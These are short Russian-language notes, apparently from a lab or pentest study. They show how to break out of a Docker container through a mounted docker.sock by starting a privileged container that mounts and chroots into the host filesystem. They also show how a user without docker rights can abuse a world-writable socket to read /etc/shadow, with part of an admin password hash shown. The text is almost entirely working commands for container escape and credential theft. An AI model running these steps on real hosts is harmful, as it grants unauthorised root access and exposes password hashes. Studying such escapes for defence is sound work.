Запускаем уязвимый контейнер
```bash
docker run -it -v /var/run/docker.sock:/run/docker.sock docker:dind /bin/sh
```

Внутри контейнера запускаем новый привилегированный контейнер
```bash
docker run -it --privileged -v /:/host/ ubuntu bash -c "chroot /host/"
```

(Если вдруг не работает `apt update` внутри контейнера)
```bash
cat <<EOF > /etc/apt/apt.conf.d/sandbox-disable
APT::Sandbox::User "root";
EOF
```

Эксплуатация Docker-Socket-а пользователем без прав на docker
```
(host)$ groups | grep -o docker
(host)$ ls -l /var/run/docker.sock
srw-rw-rw- 1 root docker 0 Dec 20 13:16 /var/run/docker.sock
(host)$ docker run -it --rm -v /:/host ubuntu:latest bash (cont)# grep admin /host/etc/shadow admin:$6$VOSV5AVQ$jHWxAVAUgl...:18142:0:99999:7:::
```